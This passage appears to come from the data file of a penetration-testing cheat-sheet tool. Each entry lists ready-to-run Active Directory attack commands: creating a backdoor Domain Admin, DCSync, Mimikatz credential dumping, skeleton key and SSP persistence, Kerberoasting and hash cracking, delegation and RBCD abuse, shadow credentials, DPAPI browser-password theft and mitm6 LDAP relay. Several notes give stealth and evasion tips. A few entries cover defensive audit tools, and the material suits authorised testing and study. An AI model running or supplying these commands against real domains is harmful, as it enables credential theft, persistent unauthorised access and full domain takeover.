+    tags: ['have-username','have-password','proto-ldap','cat-privesc'],
+    cmd: `# Confirm you are in Account Operators
+whoami /groups | findstr "Account Operators"
+
+# Step 1: Create a new user
+net user <newuser> <password> /add /domain
+
+# Step 2: Add to Exchange Windows Permissions (has WriteDACL on domain by default)
+net group "Exchange Windows Permissions" <newuser> /add
+
+# Step 3: (Optional) Add to Remote Management Users for WinRM access
+net localgroup "Remote Management Users" <newuser> /add
+
+# Step 4: Grant DCSync rights via PowerView
+Import-Module .\\PowerView.ps1
+$pass = ConvertTo-SecureString '<password>' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('<domain>\\<newuser>', $pass)
+Add-ObjectACL -PrincipalIdentity <newuser> -Credential $cred -Rights DCSync
+
+# Step 5: DCSync
+impacket-secretsdump '<domain>/<newuser>:<pass>@<DC-IP>'`,
+    note: 'Common path in HTB Forest. Exchange Windows Permissions has WriteDACL on the domain object by default — this is a known AD misconfiguration.'
+  },
+  {
+    title: 'Create Backdoor Domain Admin',
+    req: 'Domain Admin privileges',
+    gets: 'Persistent DA access via a new account',
+    tags: ['have-domainadmin','cat-persist'],
+    cmd: `# Create new user and add to DA (noisy)
+net user backdoor P@ssword123! /add /domain
+net group "Domain Admins" backdoor /add /domain
+
+# Verify
+net group "Domain Admins" /domain
+
+# More stealthy: add to other privileged groups
+net group "Enterprise Admins" backdoor /add /domain
+
+# Cleanup (defenders do this)
+# Reset krbtgt password TWICE to invalidate Golden Tickets
+# net user krbtgt <newpass> /domain  (do twice)`,
+    warn: 'Creating new DA accounts is logged and triggers alerts in any monitored environment. Use Golden/Silver tickets for stealthier persistence.'
+  },
+  {
+    title: 'Rubeus — Kerberos Swiss Army Knife',
+    req: 'Shell on Windows domain-joined host',
+    gets: 'Kerberoast hashes, AS-REP hashes, TGT harvesting, PTT, overpass-the-hash',
+    tags: ['have-username','have-password','have-hash','proto-kerberos','cat-dump','cat-lateral'],
+    cmd: `# Kerberoasting
+Rubeus.exe kerberoast /outfile:kerberoast.txt
+
+# AS-REP Roasting
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# Harvest TGTs from LSASS continuously
+Rubeus.exe harvest /interval:30
+
+# Pass-the-Ticket
+Rubeus.exe ptt /ticket:<base64-or-.kirbi-path>
+
+# Overpass-the-Hash (NTLM hash → TGT → lateral movement)
+Rubeus.exe asktgt /user:<user> /rc4:<NTLM-hash> /ptt
+
+# Monitor for specific user login, steal TGT
+Rubeus.exe monitor /interval:5 /filteruser:Administrator
+
+# Dump current tickets
+Rubeus.exe dump`
+  },
+  {
+    title: 'BloodHound Custom Cypher Queries',
+    req: 'BloodHound data imported into Neo4j',
+    gets: 'Specific attack paths, kerberoastable DA paths, ACL misconfigs, stale accounts',
+    tags: ['have-username','have-password','cat-bloodhound'],
+    cmd: `-- Count users with a path to DA
+MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
+RETURN count(distinct u)
+
+-- Kerberoastable users WITH a path to DA
+MATCH (u:User {hasspn:true})
+MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
+RETURN u.name, u.description
+
+-- Users with GenericAll on any object
+MATCH p=(u:User)-[:GenericAll]->(n)
+RETURN u.name, labels(n), n.name
+
+-- Computers with unconstrained delegation (excluding DCs)
+MATCH (c:Computer {unconstraineddelegation:true, isdc:false})
+RETURN c.name, c.operatingsystem
+
+-- All AS-REP roastable users
+MATCH (u:User {dontreqpreauth:true})
+RETURN u.name, u.description, u.admincount
+
+-- Paths using WriteDACL
+MATCH p=(u)-[:WriteDACL]->(n)
+RETURN u.name, n.name, labels(n)
+
+-- Stale enabled accounts with DA path (not logged in for 90+ days)
+MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
+WHERE u.lastlogontimestamp < (datetime().epochseconds - 7776000) AND u.enabled = true
+RETURN u.name`,
+    ref: 'https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/'
+  },
+  {
+    title: 'Hash Types & Hashcat Reference',
+    req: 'Captured hash file',
+    gets: 'Plaintext credentials',
+    tags: ['cat-dump'],
+    cmd: `# NTLM hash (SAM, NTDS.dit, LSASS)
+hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
+# CAN pass-the-hash: YES
+
+# Net-NTLMv1 (Responder capture)
+hashcat -m 5500 ntlmv1.txt /usr/share/wordlists/rockyou.txt
+# CAN pass-the-hash: NO (relay only)
+
+# Net-NTLMv2 (Responder capture — most common)
+hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
+# CAN pass-the-hash: NO (relay only)
+
+# Kerberos TGS RC4 (Kerberoasting)
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+
+# Kerberos TGS AES128 / AES256
+hashcat -m 19600 kerberoast_aes128.txt wordlist.txt
+hashcat -m 19700 kerberoast_aes256.txt wordlist.txt
+
+# Kerberos AS-REP (AS-REP Roasting)
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+
+# DCC2 / MSCache2 (LSA cached domain creds — VERY slow)
+hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt
+
+# Identify unknown hash type
+hashcat --identify hash.txt
+hash-identifier`,
+    note: 'NTLM = pass-the-hash. Net-NTLMv1/v2 = crack or relay ONLY. Never confuse the two.'
+  },
+  {
+    title: 'UAC Remote Token Filtering — Critical Concept',
+    req: 'Understanding required when PTH or remote exec fails with Access Denied',
+    gets: 'Explains why local admin connections fail and how to fix them',
+    tags: ['have-hash','have-localadmin','proto-smb','cat-lateral'],
+    cmd: `# By default: local accounts (except RID 500) get a filtered token remotely
+# = effectively NOT admin remotely, even if in Administrators group
+
+# Check the registry key:
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v LocalAccountTokenFilterPolicy
+# 0 (default) = local admins (except RID 500) get filtered token
+# 1           = all local admins get full token over network
+
+# Enable full token for local admins (if you have a shell)
+reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+# Summary:
+# Built-in Administrator (RID 500)  → always works (bypasses UAC filtering)
+# Other local admin accounts        → need LocalAccountTokenFilterPolicy=1
+# Domain accounts in local Admins   → always works (UAC does NOT filter domain accounts)
+# RDP connections                   → always full token (interactive logon, no filtering)`,
+    warn: 'If psexec/wmiexec returns Access Denied but the hash/creds look correct, UAC filtering is the most likely cause. Try with the RID 500 Administrator hash, or use RDP instead.'
+  },
+  {
+    title: 'Privileged Groups & Dangerous Privileges',
+    req: 'Shell on domain-joined host',
+    gets: 'Reference for what each group/privilege unlocks',
+    tags: ['cat-enum','cat-privesc'],
+    cmd: `# Check current privileges
+whoami /priv
+whoami /groups
+
+# Dangerous privileges:
+# SeDebugPrivilege          → open any process (LSASS) → dump all creds
+# SeImpersonatePrivilege    → Potato attacks → SYSTEM  (common on service accounts)
+# SeAssignPrimaryToken      → Potato attacks → SYSTEM
+# SeBackupPrivilege         → read any file → copy NTDS.dit, SAM, SYSTEM
+# SeRestorePrivilege        → write any file → replace binaries
+# SeLoadDriverPrivilege     → load kernel driver → kernel level
+# SeTakeOwnershipPrivilege  → own any file/reg key → modify
+# SeCreateTokenPrivilege    → forge access tokens directly
+
+# High-value groups:
+# Backup Operators        → SeBackupPrivilege → copy NTDS.dit → all hashes
+# Server Operators        → modify service binaries → SYSTEM
+# Account Operators       → create/modify users → add to Exchange WP → DCSync
+# Print Operators         → SeLoadDriverPrivilege → kernel
+# Domain Admins           → local admin everywhere
+# DNSAdmins               → load DLL via DNS service → SYSTEM on DC`,
+    note: 'SeImpersonatePrivilege on any service account = instant SYSTEM via Potato attacks. This is extremely common.'
+  },
+  {
+    title: 'ADCS Shadow Credentials (Certipy)',
+    req: 'GenericWrite on a user/computer object (write to msDS-KeyCredentialLink)',
+    gets: 'TGT + NT hash of the target account',
+    tags: ['have-username','have-password','have-adcs','cat-adcs','cat-privesc'],
+    cmd: `# Shadow credentials attack — writes a key credential to the target
+certipy shadow auto -u '<user>@<domain>' -p '<pass>' -account <target-user>
+
+# Manual steps:
+# Step 1: Add key credential
+certipy shadow add -u '<user>@<domain>' -p '<pass>' -account <target-user>
+
+# Step 2: Authenticate as target using the certificate
+certipy shadow cert -u '<user>@<domain>' -p '<pass>' -account <target-user>
+
+# Output: NT hash of target user → PTH to get shell
+evil-winrm -i <DC-IP> -u <target-user> -H <NT-hash>`
+  },
+  {
+    title: 'DPAPI — Browser Passwords & Saved Credentials',
+    req: 'Local admin on target',
+    gets: 'Browser saved passwords, saved RDP credentials, WiFi passwords',
+    tags: ['have-localadmin','cat-dump'],
+    cmd: `# CME DPAPI module
+crackmapexec smb <IP> -u <user> -p <pass> -M dpapi
+
+# Impacket (from attacker)
+impacket-dpapi masterkey -file <masterkey-path> -sid <user-sid> -password <user-password>
+
+# From victim (PowerShell / C#)
+# DPAPI blobs live in:
+# %APPDATA%\\Microsoft\\Protect\\<SID>\\         (master keys)
+# %APPDATA%\\Microsoft\\Credentials\\            (credential blobs)
+
+# Chrome passwords (if running as that user)
+# %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data
+
+# Seatbelt — enumerate DPAPI blobs
+Seatbelt.exe CredEnum
+Seatbelt.exe WindowsCredentialFiles`,
+    ref: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets'
+  },
+  {
+    title: 'Seatbelt — Host Security Posture Recon',
+    req: 'Shell on Windows target',
+    gets: 'AV, AppLocker, credential files, DPAPI blobs, interesting reg keys, OS config',
+    tags: ['have-localadmin','cat-enum'],
+    cmd: `# Full recon
+Seatbelt.exe -group=all
+
+# User-focused checks
+Seatbelt.exe -group=user
+
+# Credential file hunting
+Seatbelt.exe CredEnum
+Seatbelt.exe WindowsCredentialFiles
+Seatbelt.exe DpapiMasterKeys
+
+# Specific checks
+Seatbelt.exe AntiVirus
+Seatbelt.exe AppLockerSettings
+Seatbelt.exe AutoRuns
+Seatbelt.exe ChromiumPresence`
+  },
+  {
+    title: 'PingCastle / ADRecon — AD Health Assessment',
+    req: 'Valid domain credentials (domain-joined Windows machine for PingCastle)',
+    gets: 'Scored risk report highlighting AD misconfigs for prioritized remediation',
+    tags: ['have-username','have-password','cat-enum','cat-bloodhound'],
+    cmd: `# PingCastle — free AD health check (generates HTML report)
+PingCastle.exe --healthcheck --server <DC>
+PingCastle.exe --healthcheck --server *    # all domains in forest
+# Output: risk score + findings (delegation, stale objects, trusts, weak passwords)
+
+# ADRecon — comprehensive AD export to Excel/CSV
+.\\ADRecon.ps1 -OutputType Excel
+# Covers: users, groups, GPOs, ACLs, trusts, subnets, fine-grained password policies
+
+# PlumHound — actionable remediation reports from BloodHound data
+python3 PlumHound.py --easy -p <neo4j-password>
+# Opens reports/index.html with DA paths, Kerberoastable users, ACL misconfigs
+
+# GoodHound — prioritize paths by blast radius (how many users affected)
+goodhound -p <neo4j-password>
+goodhound -p <neo4j-password> -o csv -f goodhound_results.csv`,
+    note: 'Use PingCastle/ADRecon for audit/assessment reporting. Use PlumHound/GoodHound to prioritize remediation when you have BloodHound data.'
+  },
+  {
+    title: 'adPEAS — Automated AD Enumeration',
+    req: 'Valid domain credentials, PowerShell on a Windows host',
+    gets: 'Comprehensive auto-assessment: Kerberoastable accounts, ASREP, delegation, ADCS ESC findings, DCSync rights, GPP passwords',
+    tags: ['have-username','have-password','proto-ldap','proto-smb','proto-kerberos','cat-enum'],
+    cmd: `Import-Module .\\adPEAS.ps1
+
+# Full auto-run with current user context
+Invoke-adPEAS
+
+# Specify domain and DC
+Invoke-adPEAS -Domain 'domain.local' -DomainController 'DC01.domain.local'
+
+# With explicit credentials
+$SecPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('domain\\user', $SecPassword)
+Invoke-adPEAS -Credential $Cred
+
+# Run specific modules only
+Invoke-adPEAS -Module Creds          # credential material
+Invoke-adPEAS -Module Delegations    # delegation misconfigs
+Invoke-adPEAS -Module ADCS           # ADCS certificate misconfigs
+Invoke-adPEAS -Module Kerberoast     # SPN accounts
+Invoke-adPEAS -Module Bloodhound     # calls SharpHound internally
+
+# What it checks automatically:
+# Domain info, trusts, DCs, password policy
+# Kerberoastable service accounts (SPNs)
+# AS-REP roastable users (preauth disabled)
+# Unconstrained / Constrained / RBCD delegation
+# ADCS misconfigs (ESC1-ESC8) via embedded Certify
+# DCSync rights (non-standard principals)
+# GPP passwords in SYSVOL
+# Readable/interesting shares
+# Outdated and EOL operating systems`,
+    note: 'adPEAS is a single-script automated AD assessor. Run it early — it surfaces most high-value attack paths in one go.'
+  },
+  {
+    title: 'ldapdomaindump — Full LDAP Dump to Browsable HTML',
+    req: 'Valid domain credentials, LDAP access to DC',
+    gets: 'HTML reports for all AD objects: users, groups, computers, GPOs, password policy, trusts',
+    tags: ['have-username','have-password','proto-ldap','cat-enum'],
+    cmd: `# Basic dump
+ldapdomaindump -u 'domain\\user' -p 'password' <DC-IP> -o ldap_dump/
+
+# With LDAPS (port 636)
+ldapdomaindump -u 'domain\\user' -p 'password' <DC-IP> -o ldap_dump/ --no-json --no-grep
+
+# Files generated:
+# ldap_dump/index.html         → main index
+# domain_users.html            → all users + attributes (description, groups, pwdLastSet, UAC)
+# domain_groups.html           → all groups + members
+# domain_computers.html        → all machines + OS versions
+# domain_policy.html           → password policy, Kerberos policy
+# domain_trusts.html           → domain trusts
+
+# Things to look for:
+# Users with password in the description field
+# Service accounts (look for SPN column)
+# Admin accounts (adminCount=1)
+# Computers running EOL OS (Server 2008, Windows 7)
+# Users with PasswordNotRequired or PasswordNeverExpires flags
+# Recently created accounts (possible attacker persistence)`,
+    note: 'ldapdomaindump is faster to browse than raw ldapsearch and the output can be combined with BloodHound-style analysis. Run it immediately after validating creds.'
+  },
+  {
+    title: 'PowerSploit PowerUp — Local Privilege Escalation Checks',
+    req: 'Shell on Windows host (any privilege level)',
+    gets: 'Unquoted service paths, writable service binaries, AlwaysInstallElevated, AutoLogon creds, modifiable autoruns',
+    tags: ['have-foothold','have-nocreds','cat-privesc'],
+    cmd: `# Load
+Import-Module .\\PowerUp.ps1
+# Bypass execution policy
+powershell -ep bypass -c "Import-Module .\\PowerUp.ps1; Invoke-AllChecks"
+
+# Run all checks at once
+Invoke-AllChecks
+
+# Individual checks
+Get-ServiceUnquoted -Verbose             # unquoted service paths with spaces
+Get-ModifiableServiceFile -Verbose       # service binary you can overwrite
+Get-ModifiableService -Verbose           # services with weak SCM permissions
+Get-ModifiableRegistryAutoRun            # writable autorun entries
+Get-CachedGPPPassword                    # GPP cPasswords in cached policies
+Get-UnattendedInstallFile                # unattend.xml with credentials
+Get-RegistryAutoLogon                    # AutoLogon plaintext creds in registry
+
+# Exploit unquoted service path
+Write-ServiceBinary -Name '<ServiceName>' -UserName 'DOMAIN\\backdoor' -Password 'P@ss'
+Invoke-ServiceAbuse -Name '<ServiceName>' -Command 'net user hacker P@ss /add'
+
+# Abuse modifiable service binary
+Write-ServiceBinary -Name '<ServiceName>' -Path 'C:\\Program Files\\Svc\\vuln.exe'
+
+# AlwaysInstallElevated → SYSTEM
+Write-UserAddMSI       # creates Add-User.msi that installs a new local admin`,
+    note: 'Invoke-AllChecks is the fastest way to find local privesc. PowerUp is part of PowerSploit and works well combined with WinPEAS for coverage.'
+  },
+  {
+    title: 'PowerSploit — Find-LocalAdminAccess & User Hunting',
+    req: 'Valid domain credentials',
+    gets: 'Every machine where you are local admin, where DAs are currently logged in',
+    tags: ['have-username','have-password','proto-smb','proto-ldap','cat-enum'],
+    cmd: `Import-Module .\\PowerView.ps1
+
+# Find every machine where your current token has local admin
+Find-LocalAdminAccess -Verbose
+# Returns hostnames → directly psexec / wmiexec to these
+
+# Test admin access to a specific host
+Test-AdminAccess -ComputerName <hostname>
+
+# Find where domain admins are currently logged in
+Find-DomainUserLocation -Verbose
+Find-DomainUserLocation -UserGroupIdentity "Domain Admins" -Verbose
+
+# UserHunter — is a specific user logged into any reachable machine?
+Invoke-UserHunter -UserName <DA-username> -Verbose
+Invoke-UserHunter -CheckAccess   # only show machines where you also have local admin
+
+# Find shares across the domain
+Find-DomainShare -CheckShareAccess -Verbose
+Find-InterestingDomainShareFile -Include *passwords* -Verbose
+Find-InterestingDomainShareFile -Include *creds* -Verbose
+Find-InterestingDomainShareFile -Include *.kdbx* -Verbose
+
+# Who gets local admin via GPO?
+Get-DomainGPOComputerLocalGroupMapping -Verbose`,
+    note: 'Find-LocalAdminAccess + Invoke-UserHunter together = BloodHound "Shortest Path from Owned" in PowerShell form. Very useful when BloodHound GUI is not available.'
+  },
+  {
+    title: 'AD Module — Native PowerShell Enumeration (Signed / Stealthy)',
+    req: 'Valid domain credentials, ActiveDirectory module available (RSAT or DC)',
+    gets: 'Full domain enumeration using built-in signed Microsoft binaries — harder to detect than PowerSploit',
+    tags: ['have-username','have-password','proto-ldap','cat-enum'],
+    cmd: `# Check if available
+Get-Command -Module ActiveDirectory
+# If not: Import-Module ActiveDirectory  (or install RSAT)
+
+# Domain info
+Get-ADDomain
+Get-ADDomainController -Filter *
+(Get-ADForest).Domains
+
+# Users
+Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description,PasswordLastSet,Enabled
+Get-ADUser -Filter {Description -like "*pass*"} -Properties Description | select Name,Description
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} | select Name   # AS-REP roastable
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select Name,SPN
+Get-ADUser -Filter {AdminCount -eq 1} | select Name                  # protected admin accounts
+Get-ADUser -Filter {Enabled -eq $True -and PasswordNeverExpires -eq $True} | select Name
+
+# Groups
+Get-ADGroup -Filter * | select Name,GroupScope
+Get-ADGroupMember -Identity "Domain Admins" -Recursive
+Get-ADGroupMember -Identity "Backup Operators"
+Get-ADPrincipalGroupMembership -Identity <user> | select Name
+
+# Computers
+Get-ADComputer -Filter * -Properties * | select Name,OperatingSystem,IPv4Address
+Get-ADComputer -Filter {TrustedForDelegation -eq $True}              # unconstrained delegation
+Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+
+# Trusts + Forest
+Get-ADTrust -Filter *
+Get-ADForest | select Domains,GlobalCatalogs
+
+# AppLocker policy
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# Fine-grained password policies
+Get-ADFineGrainedPasswordPolicy -Filter *`,
+    note: 'AD Module uses signed Microsoft DLLs — far less likely to trigger EDR/AV than PowerSploit. Prefer it when operating in monitored environments.'
+  },
+  {
+    title: 'Mimikatz — Full Command Reference',
+    req: 'Local admin + SeDebugPrivilege (run privilege::debug first)',
+    gets: 'Credentials from LSASS, SAM, DCSync, Kerberos ticket manipulation, persistence',
+    tags: ['have-localadmin','have-domainadmin','cat-dump','cat-persist'],
+    cmd: `# Elevate privileges first
+privilege::debug
+token::elevate
+
+# === CREDENTIAL DUMPING ===
+sekurlsa::logonpasswords           # NTLM hashes + cleartext (if WDigest enabled)
+sekurlsa::wdigest                  # WDigest plaintext (needs UseLogonCredential=1)
+sekurlsa::kerberos                 # Kerberos session info
+sekurlsa::tickets                  # all TGTs + TGSs in memory
+sekurlsa::tickets /export          # export each to .kirbi file
+sekurlsa::ekeys                    # AES-128/256 session keys
+sekurlsa::dpapi                    # DPAPI masterkeys
+sekurlsa::minidump lsass.dmp       # parse offline LSASS dump
+# then run: sekurlsa::logonpasswords
+
+# === SAM / LSA (requires SYSTEM) ===
+lsadump::sam                       # local account NTLM hashes
+lsadump::secrets                   # LSA secrets (service accounts, machine hash)
+lsadump::cache                     # cached domain creds (DCC2)
+
+# === DCSYNC (requires DA or DCSync rights) ===
+lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt
+lsadump::dcsync /domain:<domain> /all /csv
+
+# === KERBEROS TICKETS ===
+kerberos::list /dump               # list + export tickets
+kerberos::ptt <ticket.kirbi>       # import ticket into current session
+kerberos::purge                    # clear all current tickets
+
+# === FORGE TICKETS ===
+# Golden Ticket (krbtgt hash + domain SID)
+kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /krbtgt:<hash> /ptt
+# Silver Ticket (service account hash)
+kerberos::golden /user:user /domain:<domain> /sid:<SID> /target:<host> /service:cifs /rc4:<svc-hash> /ptt
+
+# === PERSISTENCE ===
+misc::skeleton                     # Skeleton Key — any user can login with "mimikatz"
+misc::memssp                       # SSP hook — logs all future logins to kiwissp.log
+
+# === PASS-THE-HASH (spawn process with different creds) ===
+sekurlsa::pth /user:Administrator /ntlm:<hash> /domain:<domain> /run:cmd.exe
+sekurlsa::pth /user:Administrator /ntlm:<hash> /domain:<domain> /run:"mstsc.exe /restrictedadmin"
+
+# === CREDENTIAL MANAGER ===
+vault::list
+vault::cred /patch
+
+# Enable WDigest — future logins stored in plaintext (reboot-safe)
+reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1`,
+    note: 'Run privilege::debug before everything else. If it fails, you lack SeDebugPrivilege — use token::elevate to grab SYSTEM token, or dump via Task Manager first.'
+  },
+  {
+    title: 'Unconstrained Delegation — TGT Theft + PrinterBug',
+    req: 'Local admin on a machine with Unconstrained Delegation (not a DC)',
+    gets: 'TGT of any user that connects — including DA — allowing full domain takeover',
+    tags: ['have-localadmin','proto-kerberos','proto-smb','cat-delegation','cat-lateral'],
+    cmd: `# Step 1: Find unconstrained delegation machines (DCs have it by default — skip them)
+Get-DomainComputer -Unconstrained -Properties dnshostname
+crackmapexec ldap <DC-IP> -u <user> -p <pass> --trusted-for-delegation
+
+# Step 2: On the unconstrained delegation machine (as local admin)
+# Monitor for incoming TGTs continuously
+Rubeus.exe monitor /interval:5 /nowrap
+# Also check manually:
+mimikatz "sekurlsa::tickets" exit
+
+# Step 3: Force the DC to connect to our machine (triggers TGT deposit)
+# PrinterBug — abuses MS-RPRN (Print Spooler) to force DC authentication
+# Requires Print Spooler running on the DC (default on older servers)
+SpoolSample.exe <DC-hostname> <our-unconstrained-machine-hostname>
+# Linux equivalent:
+python3 printerbug.py '<domain>/<user>:<pass>@<DC-hostname>' <our-machine-hostname>
+
+# Alternatively: PetitPotam (EfsRpcOpenFileRaw — works even without Print Spooler)
+python3 PetitPotam.py <our-machine-hostname> <DC-hostname>
+
+# Step 4: Capture the TGT from Rubeus monitor output, then inject it
+Rubeus.exe ptt /ticket:<base64-ticket>
+
+# Step 5: DCSync with the stolen DC/DA TGT
+mimikatz "lsadump::dcsync /domain:<domain> /user:<domain>\\krbtgt" exit
+# OR via impacket:
+impacket-secretsdump -k -no-pass '<domain>/DC$@<DC-hostname>'`,
+    note: 'Unconstrained delegation + PrinterBug or PetitPotam = reliable DA in most older domains. Very common misconfiguration. BloodHound query: "Computers with Unconstrained Delegation".',
+    ref: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained'
+  },
+  {
+    title: 'Constrained Delegation — S4U2Self + S4U2Proxy',
+    req: 'NTLM hash or password of a user/computer with constrained delegation configured',
+    gets: 'Service ticket as any domain user (including DA) for the delegated service',
+    tags: ['have-hash','have-password','proto-kerberos','cat-delegation','cat-privesc'],
+    cmd: `# Step 1: Find constrained delegation accounts
+Get-DomainUser -TrustedToAuth | select samaccountname,'msds-allowedtodelegateto'
+Get-DomainComputer -TrustedToAuth | select dnshostname,'msds-allowedtodelegateto'
+Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+crackmapexec ldap <DC-IP> -u <user> -p <pass> --trusted-for-delegation
+
+# Step 2a: Rubeus — S4U2Self + S4U2Proxy (request TGS as Administrator)
+Rubeus.exe s4u /user:<deleg-user> /rc4:<NTLM-hash> /impersonateuser:Administrator /msdsspn:"<service>/<target-fqdn>" /ptt
+
+# Step 2b: Impacket (from Linux)
+impacket-getST -spn '<service>/<target-fqdn>' -impersonate Administrator '<domain>/<deleg-user>:<pass>' -dc-ip <DC-IP>
+export KRB5CCNAME=Administrator@<service>_<target>.ccache
+impacket-psexec -k -no-pass <domain>/Administrator@<target-fqdn>
+
+# Common service types:
+# cifs/<target>    → SMB / file shares
+# host/<target>    → WMI, RPC, Task Scheduler
+# http/<target>    → WinRM, Exchange, web apps
+# ldap/<target>    → LDAP operations (DCSync)
+
+# Pro tip: Rubeus /altservice rewrites the service name in TGS
+# e.g., if you have cifs/target, you can rewrite to ldap/target for DCSync`,
+    note: 'The impersonated user must not be in the "Protected Users" group or have the "Account is sensitive and cannot be delegated" flag set.',
+    ref: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained'
+  },
+  {
+    title: 'RBCD — Resource Based Constrained Delegation',
+    req: 'GenericWrite or GenericAll on a computer object + machine account creation rights (default: any domain user can create 10)',
+    gets: 'Shell as any domain user on the target machine',
+    tags: ['have-password','have-username','proto-ldap','proto-kerberos','cat-delegation','cat-privesc'],
+    cmd: `# Step 1: Create a fake machine account
+Import-Module .\\Powermad.ps1
+New-MachineAccount -MachineAccount FakeMachine -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)
+# Or from Linux:
+impacket-addcomputer '<domain>/<user>:<pass>' -computer-name 'FakeMachine$' -computer-pass 'FakePass123!' -dc-ip <DC-IP>
+
+# Step 2: Get SID of new machine account
+Import-Module .\\PowerView.ps1
+$sid = Get-DomainComputer FakeMachine -Properties objectsid | Select-Object -ExpandProperty objectsid
+
+# Step 3: Set msds-allowedtoactonbehalfofotheridentity on target computer
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer <TargetMachine> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+# Or from Linux:
+impacket-rbcd -delegate-from 'FakeMachine$' -delegate-to '<TargetMachine$>' -action write '<domain>/<user>:<pass>' -dc-ip <DC-IP>
+
+# Step 4: Get RC4 hash of fake machine password
+Rubeus.exe hash /password:'FakePass123!'
+
+# Step 5: Request service ticket impersonating Administrator
+Rubeus.exe s4u /user:FakeMachine$ /rc4:<RC4-hash> /impersonateuser:Administrator /msdsspn:'cifs/<TargetMachine.domain.local>' /ptt
+# Or from Linux:
+impacket-getST -spn 'cifs/<TargetMachine.domain.local>' -impersonate Administrator '<domain>/FakeMachine$:FakePass123!' -dc-ip <DC-IP>
+export KRB5CCNAME=Administrator@cifs_<TargetMachine>.ccache
+impacket-psexec -k -no-pass <domain>/Administrator@<TargetMachine.domain.local>
+
+# Cleanup
+Get-DomainComputer <TargetMachine> | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'`,
+    note: 'RBCD requires GenericWrite on a computer object. BloodHound highlights these paths under "Shortest Path from Owned Principals". Common from ACL misconfiguration chains.',
+    ref: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd'
+  },
+  {
+    title: 'Targeted Kerberoasting — Force SPN via GenericWrite',
+    req: 'GenericWrite or GenericAll on a target user account',
+    gets: 'TGS hash for that specific user — crack offline for their plaintext password',
+    tags: ['have-username','have-password','proto-kerberos','proto-ldap','cat-dump','cat-privesc'],
+    cmd: `# Verify target doesn't already have a SPN
+Get-DomainUser <target-user> -Properties serviceprincipalname
+
+# Step 1: Set a fake SPN on the target (requires GenericWrite on that user)
+Set-DomainObject -Identity <target-user> -Set @{serviceprincipalname='fake/spn.domain.local'}
+# AD Module alternative:
+Set-ADUser -Identity <target-user> -ServicePrincipalNames @{Add='fake/spn.domain.local'}
+
+# Step 2: Kerberoast the target
+impacket-GetUserSPNs -dc-ip <DC-IP> '<domain>/<user>:<pass>' -request -outputfile targeted.txt
+# Or Rubeus:
+Rubeus.exe kerberoast /user:<target-user> /outfile:targeted.txt
+
+# Step 3: Crack
+hashcat -m 13100 targeted.txt /usr/share/wordlists/rockyou.txt
+
+# Step 4: Clean up the SPN (avoid leaving traces)
+Set-DomainObject -Identity <target-user> -Clear serviceprincipalname
+# Verify cleaned:
+Get-DomainUser <target-user> -Properties serviceprincipalname`,
+    note: 'Targeted Kerberoasting is useful when BloodHound shows GenericWrite on a high-value account (service account, helpdesk, IT admin). That account becomes instantly Kerberoastable.'
+  },
+  {
+    title: 'mitm6 — IPv6 Poisoning + LDAP(S) Relay',
+    req: 'Network access, IPv6 enabled on the network (default on Windows Vista+)',
+    gets: 'LDAP relay → create new DA account, or dump domain info via ldapdomaindump',
+    tags: ['have-nocreds','proto-network','proto-ldap','cat-lateral','cat-dump'],
+    cmd: `# Windows prefers IPv6 for DHCPv6 and DNS. mitm6 responds to DHCPv6 requests,
+# sets attacker as the IPv6 DNS server, then machines send WPAD auth → relay to LDAP(S)
+
+# Terminal 1: Start mitm6 (sends fake DHCPv6 responses)
+sudo mitm6 -d <domain> -i eth0
+
+# Terminal 2a: Relay to LDAP — dump domain info via ldapdomaindump
+impacket-ntlmrelayx -6 -t ldap://<DC-IP> --no-smb-server -wh fakewpad.<domain> -l loot/
+
+# Terminal 2b: Relay to LDAPS — create new DA account when DA machine authenticates
+impacket-ntlmrelayx -6 -t ldaps://<DC-IP> --no-smb-server -wh fakewpad.<domain> --delegate-access
+
+# Terminal 2c: Relay + ACL abuse (grant DCSync rights to compromised account)
